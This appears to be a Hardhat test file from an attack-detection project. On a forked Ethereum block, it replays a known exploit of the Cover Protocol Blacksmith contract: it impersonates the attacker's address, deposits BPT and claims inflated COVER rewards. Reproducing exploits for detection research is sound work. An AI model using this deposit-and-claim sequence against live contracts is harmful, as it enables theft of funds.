import { ethers } from 'hardhat'
import { Blacksmith, IERC20, OpynInterface } from '../typechain-types'
import { expect } from 'chai'
const hre = require('hardhat')

describe('CCA Detects Cover Test', async function () {
    let attacker: string
    let bs: Blacksmith
    let bptAddress: string
    let bpt: IERC20
    let covereAddress: string
    let cover: IERC20

    beforeEach(async () => {
        bs = await ethers.getContractAt('Blacksmith', '0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5')
        expect(await bs.getAddress()).to.equal('0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5')
        bptAddress = ethers.getAddress('0x59686E01Aa841f622a43688153062C2f24F8fDed')
        bpt = await ethers.getContractAt('IERC20', bptAddress)
        covereAddress = ethers.getAddress('0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286')
        cover = await ethers.getContractAt('IERC20', covereAddress)
    })

    it('should block number equal to 11542309', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(11542309)
    })

    it('should simulate the attack on Opyn', async function () {
        attacker = '0x00007569643bc1709561ec2E86F385Df3759e5DD'

        await hre.network.provider.request({
            method: 'hardhat_impersonateAccount',
            params: [attacker],
        })

        const impersonatedSigner = await ethers.getSigner(attacker)

        let balanceBefore = await cover.balanceOf(attacker)
        console.log('Attacker Cover balance before is     ', balanceBefore.toString())

        const tx = await bs.connect(impersonatedSigner).deposit(await bpt.getAddress(), 15255552810089260015361n)
        await tx.wait()
        const tx2 = await bs.connect(impersonatedSigner).claimRewards(await bpt.getAddress())
        await tx2.wait()
        let balanceAfter = await cover.balanceOf(attacker)
        console.log('Attacker Cover balance after is     ', balanceAfter.toString())
    })
})
